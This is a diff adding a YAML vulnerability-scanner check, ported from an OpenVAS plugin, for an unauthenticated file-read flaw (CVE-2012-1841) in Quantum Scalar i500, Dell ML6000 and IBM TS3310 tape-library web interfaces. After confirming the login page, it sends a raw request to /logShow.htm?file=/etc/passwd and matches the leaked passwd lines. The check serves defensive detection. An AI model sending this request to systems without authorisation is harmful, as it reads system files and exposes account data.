@@ -1,0 +1,84 @@
+# Quantum Scalar i500 / Dell ML6000 / IBM TS3310 — information disclosure (LFI)
+#
+# The tape-library web management interface (Quantum Scalar i500, rebranded as
+# Dell ML6000 and IBM TS3310) exposes an unauthenticated log-viewer endpoint
+# `/logShow.htm?file=/<path>` that reads an arbitrary file off the appliance and
+# returns its contents, allowing retrieval of sensitive files such as
+# /etc/passwd. Tracked by CVE-2012-1841 / CVE-2012-1842 / CVE-2012-1844.
+#
+# Detection (active, two-stage — faithful to the NASL):
+#   1. GET /index.htm and confirm the appliance via its login-page <title>.
+#   2. GET /logShow.htm?file=/etc/passwd and confirm the leaked passwd content.
+# Both requests are issued as verbatim HTTP/1.0 via tcp_connect so the raw
+# request path reaches the target unchanged. QoD 75 (response analysis).
+#
+# Ported from OpenVAS/Greenbone NVT 2012/gb_quantum_scalar_52566.nasl
+# (GPL-2.0-only). Detection details (URLs, match patterns) derive from that
+# plugin and its traversal_func.inc file list.
+uid: a797a10c-ca46-4649-a53e-d21d396ef1b1
+name: "Quantum Scalar i500 / Dell ML6000 / IBM TS3310 Information Disclosure (CVE-2012-1841)"
+description: |
+  Tests Quantum Scalar i500 and its OEM rebrands (Dell ML6000, IBM TS3310) for
+  unauthenticated arbitrary file read via the /logShow.htm log viewer. Confirms
+  the appliance by its login-page title, then reads /etc/passwd through
+  /logShow.htm?file=/etc/passwd. QoD 75.
+cves: [CVE-2012-1841, CVE-2012-1842, CVE-2012-1844]
+cvss: 7.5
+severity: high
+confidence_base: 0.35
+tags: [quantum, scalar, dell-ml6000, ibm-ts3310, lfi, information-disclosure, tape-library]
+category: file-read
+services: [http, https]
+author: noctis
+version: "1.0.0"
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2012-1841"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2012-1842"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2012-1844"
+  - "http://www.kb.cert.org/vuls/id/913483"
+  # Ported from OpenVAS/Greenbone NVT 2012/gb_quantum_scalar_52566.nasl (GPL-2.0-only)
+
+steps:
+  # init the gate var so the condition on later steps never hits an undefined var
+  - id: init
+    action: set_var
+    var_name: appliance_confirmed
+    var_value: false
+
+  # ── Stage 1: confirm the appliance via its login-page title ──────────────
+  - id: probe-index
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /index.htm HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: index_resp
+
+  - id: index-match
+    action: match
+    source: index_resp.banner
+    pattern: "(<title>QUANTUM - Scalar|<title>DELL - ML.* Login Screen)"
+    on_match:
+      set_vars:
+        appliance_confirmed: true
+
+  # ── Stage 2: confirm the arbitrary file read (/etc/passwd) ───────────────
+  # Verbatim HTTP/1.0 keeps the raw /logShow.htm?file=/etc/passwd path intact.
+  - id: lfi-passwd
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /logShow.htm?file=/etc/passwd HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: passwd_resp
+    condition: "appliance_confirmed == true"
+
+  - id: passwd-match
+    action: match
+    source: passwd_resp.banner
+    pattern: "(root|admin|nobody):[^:]*:[0-9]+:[0-9]+:"
+    condition: "appliance_confirmed == true"
+    on_match:
+      finding:
+        confidence_delta: 0.50
+        qod: 75
+        evidence: "Arbitrary file read confirmed — /logShow.htm leaked /etc/passwd: {{passwd_resp.banner}}"
+      stop: true
